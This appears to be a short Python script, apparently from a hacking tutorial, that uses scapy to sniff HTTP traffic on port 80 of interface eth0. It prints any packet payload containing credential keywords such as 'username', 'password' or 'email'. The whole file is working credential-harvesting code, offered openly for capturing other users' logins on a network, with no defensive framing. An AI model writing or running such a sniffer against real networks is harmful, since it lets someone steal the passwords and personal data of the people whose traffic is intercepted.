#!/usr/bin/env
import scapy.all as scapy
from scapy.layers import *
#iterating through a list of words that maybe intersting
#in the load field of the packet there maybe interesting parts like mail or password for http versions
def print_fun_packets(load):
	keywords = ["uname","username","pass","password","email","mail","POST","user"]
	for keyword in keywords:
		if keyword in load:
			print("\n\n[+] Possible user name/password\n\n")
			print(load)
			print("\n\n\n\n")
			break	

#upon sniffing a packet checking if there is raw data in the packet
#printing the possibly fun packets to deal with :-)
def process_sniffed_packet(packet):
	if packet.haslayer(scapy.Raw):
		load = packet[scapy.Raw].load
		print_fun_packets(load)

#using scapy module sniff to start sniffing packets
#store flag not to store the packets locally
#prn call back function when a packet is sniffed
#filter filters packets so that it's only http requests according to berkley's bpf syntax
def sniff(interface):
	scapy.sniff(iface=interface
	,store = False, 
	prn = process_sniffed_packet,
	filter = "tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)")

sniff("eth0")
